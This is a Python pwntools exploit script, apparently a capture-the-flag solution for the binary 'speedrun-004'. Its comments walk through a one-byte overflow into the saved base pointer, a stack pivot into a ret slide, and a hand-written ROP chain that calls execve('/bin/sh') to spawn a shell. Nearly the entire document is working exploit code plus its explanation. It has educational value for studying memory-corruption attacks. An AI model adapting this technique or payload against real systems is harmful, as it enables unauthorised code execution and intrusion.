import pwn
import struct

# speedrun-004 is a 64-bit statically linked stripped binary
# NX is enabled, ASLR is on

# We get a 1 byte overflow, which allows us to overwrite a single byte of rbp storage
# This enables us to corrupt the parent function's stack frame, so when that function returns, we do a blind jump further up the stack
# Sometimes we land in a ret slide which we put at the start of our buffer
# This exploit works around 25% of the time

target = pwn.process('./speedrun-004')

# The function at 0x400b73 is essentially a scan input function, which scans in the number of bytes we specify,
# up to 0x101 (257)
# It scans our input into a 0x100 (256) byte buffer, so we have a one byte overflow
# Looking at where our input is being scanned, at 0x400ba0 we can see that [ rbp - 0x100 ] is being used as the buffer address
# This means that there is no space between rbp storage and the end of our buffer
# This is what our stack looks like:

# [ 256 byte buffer ]
# [ previous frame rbp storage ] <-- $rbp
# [ return address ]

# So, our 1-byte overflow is a 1-byte overflow into the lsb of rbp storage
# This scan input function is called as the last thing in its calling function
# So, right after we ret from scan input, we ret from its calling function
# That function's frames base pointer will be restored when we return from the scan input function
# Remember: leave sets $rsp to $rbp, and then pops $rbp with whats on top of the stack to restore the previous frame's base ptr
# ( the pop also increments $rsp by 8, pointing it at the return address )

# So when we ret from scan input, if we have overflowed the lsb of the parent frame's rbp, the stack frame of the parent will be corrupted
# This means that the base pointer will be pointing somewhere other than where it is supposed to
# So when we try and return from the parent, the base ptr is used to set rsp before we return, which means the parent will return to a different return address

# We don't have an info leak, so we can't control exactly where that function will ret, but...
# Remember, the stack grows downward, so if we just change that lsb to \x00, we will be jumping somewhere higher on the stack
# We don't know exactly where on the stack we will be jumping because the stack base is randomized each run
# but there is a good chance we land somewhere in the next frame (the one we just returned from)
# There is also a good chance we land somewhere in our input buffer, within that frame

# We can put a ret slide at the start of our buffer, followed by a execve(/bin/sh) rop chain
# There is a decent chance we will land in our ret slide, which will mean the exploit succeeds

#############################
#### Getting rop gadgets ####
#############################

# We are just trying to put a classic full, static-style rop chain in our buffer
# ie: move "/bin/sh" to memory, and then execve("/bin/sh")
# My initial thought was to generate this rop chain with ROPgadget.py
# ROPgadget --binary speedrun--004 --ropchain
# However the resulting rop chain, is inefficient, we can ( and need to ) make it much smaller 
# We need a better rop chain, we need the human factor

payload = b''
payload += struct.pack("<Q", 0x0000000000410a93) # pop rsi ; ret
payload += struct.pack('<Q', 0x00000000006b90e0) # @ .data                                                                                   
payload += struct.pack('<Q', 0x0000000000415f04) # pop rax ; ret
payload += b'/bin//sh'                                                                                                                 
payload += struct.pack("<Q", 0x000000000047f521) # mov qword ptr [rsi], rax ; ret
payload += struct.pack('<Q', 0x0000000000400686) # pop rdi ; ret                                                          
payload += struct.pack('<Q', 0x00000000006b90e0) # @ .data
payload += struct.pack('<Q', 0x0000000000410a93) # pop rsi ; ret
payload += struct.pack('<Q', 0x0)
payload += struct.pack('<Q', 0x000000000044a155) # pop rdx ; ret
payload += struct.pack('<Q', 0x0)
payload += struct.pack('<Q', 0x0000000000415f04) # pop rax ; ret
payload += struct.pack('<Q', 0x3b)
payload += struct.pack('<Q', 0x000000000040132c) # syscall

print(f"length of payload: {hex(len(payload))}")

ret = struct.pack('<Q', 0x0000000000400687)

payload = (ret * (int)((0x100 - len(payload)) / 8)) + payload # Add ret slide to the start of our buffer
payload += b'\x00' # 1 byte overflow into rbp storage

target.sendline(b'257') # tell them the size of our input

target.sendline(payload)
target.interactive()


